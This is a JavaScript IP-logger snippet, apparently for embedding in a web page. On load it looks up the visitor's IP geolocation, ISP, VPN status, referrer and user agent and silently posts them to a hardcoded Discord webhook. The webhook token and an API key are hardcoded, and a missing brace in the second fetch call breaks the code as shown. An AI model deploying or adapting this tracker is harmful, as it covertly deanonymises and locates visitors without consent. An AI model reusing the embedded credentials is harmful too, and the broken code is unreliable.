// Function to send data to Discord webhook
function sendToDiscord(ipData, userData) {
    const webhookUrl = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT';

    // Create a message payload
    const message = {
        content: "IP Details",
        embeds: [
            {
                title: "IP Information",
                fields: [
                    { name: "IP Address", value: ipData.ip },
                    { name: "City", value: ipData.city },
                    { name: "Region", value: ipData.region },
                    { name: "Country", value: ipData.country },
                    { name: "Continent", value: ipData.continent },
                ],
            },
            {
                title: "Location",
                fields: [
                    { name: "Latitude", value: ipData.latitude },
                    { name: "Longitude", value: ipData.longitude },
                ],
            },
            {
                title: "Security",
                fields: [
                    { name: "VPN", value: ipData.security.is_vpn ? "Yes" : "No" },
                ],
            },
            {
                title: "Timezone",
                fields: [
                    { name: "Timezone Name", value: ipData.timezone.name },
                    { name: "Timezone Abbreviation", value: ipData.timezone.abbreviation },
                    { name: "Current Time", value: ipData.timezone.current_time },
                ],
            },
            {
                title: "Flag",
                image: { url: ipData.flag.png }, // Display the flag image
            },
            {
                title: "Currency",
                fields: [
                    { name: "Currency Name", value: ipData.currency.currency_name },
                    { name: "Currency Code", value: ipData.currency.currency_code },
                ],
            },
            {
                title: "Connection",
                fields: [
                    { name: "AS Number", value: ipData.connection.autonomous_system_number },
                    { name: "AS Organization", value: ipData.connection.autonomous_system_organization },
                    { name: "Connection Type", value: ipData.connection.connection_type },
                    { name: "ISP Name", value: ipData.connection.isp_name },
                ],
            },
            {
                title: "User Information",
                fields: [
                    { name: "Date", value: userData.date.toString() },
                    { name: "Day", value: userData.day },
                    { name: "Time", value: userData.time },
                    { name: "Referring URL", value: userData.referringURL },
                    { name: "User Agent", value: userData.userAgent },
                ],
            },
        ],
    };

    // Send the message to Discord
    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify(message),
    })
    .then(response => response.json())
    .then(responseData => console.log("Data sent to Discord:", responseData))
    .catch(error => console.error("Error sending data to Discord:", error));
}

// Fetch IP address from Abstract API
fetch("https://app.abstractapi.com/q", {
    method: "GET",
    headers: {
        "X-API-KEY": "577cf8161d6e494bb7fb0df8e0b9102e", 
})
    .then(response => response.json())
    .then(ipData => {
        // Collect user information
        const userInformation = {
            date: new Date(),
            day: new Intl.DateTimeFormat('en-US', { weekday: 'long' }).format(new Date()),
            time: new Intl.DateTimeFormat('en-US', { timeStyle: 'short' }).format(new Date()),
            referringURL: document.referrer,
            userAgent: navigator.userAgent,
        };

        // Send data to Discord webhook
        sendToDiscord(ipData, userInformation);
    })
    .catch(error => console.error("Error fetching IP details: ", error));
